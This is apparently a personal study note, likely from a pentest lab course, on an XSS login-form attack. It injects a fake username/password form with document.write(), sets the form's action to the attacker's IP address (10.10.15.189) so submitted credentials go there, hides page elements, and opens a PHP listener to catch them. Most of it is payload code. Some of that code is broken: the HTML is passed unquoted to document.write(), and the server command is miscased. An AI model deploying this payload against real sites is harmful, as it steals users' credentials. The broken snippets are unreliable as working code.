
---
### Login Form Attack

##### 1. Constructing the Payload

This is a type of [[Cross Site Scripting (XSS)]] attack.
- This form would be injected into the discover XSS injection point.

```HTML
<form action=http://OUR-IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
> Place in the `action` tag our [[IP]] address so that on submission of the form, the credentials are sent to our machine.

We can inject this form into the vulnerable parameter using this JavaScript function `document.write()`, which writes the content directly into the HTML of the page.

```JavaScript
document.write(
	<form action=http://OUR-IP>
	<input type="username" name="username" placeholder="Username">
	<input type="password" name="password" placeholder="Password">
	<input type="submit" name="submit" value="Login">
	</form>
);
```

This will add our login form to the page, but it will not remove other parts of the page that we might want to not appear. 
- To do that, use the `document.getElementById().remove()` function.

Therefore, the final payload: 

```JavaScript
document.write(
	<form action=http://10.10.15.189>
	<input type="username" name="username" placeholder="Username">
	<input type="password" name="password" placeholder="Password">
	<input type="submit" name="submit" value="Login">
	</form>
);
document.getElementById('to-remove').remove();
```

##### 2. Stealing the Credentials

Open a listener, either using [[netcat]], or a PHP server.

```bash
sudo PHP -s 0.0.0.0:80
```

---
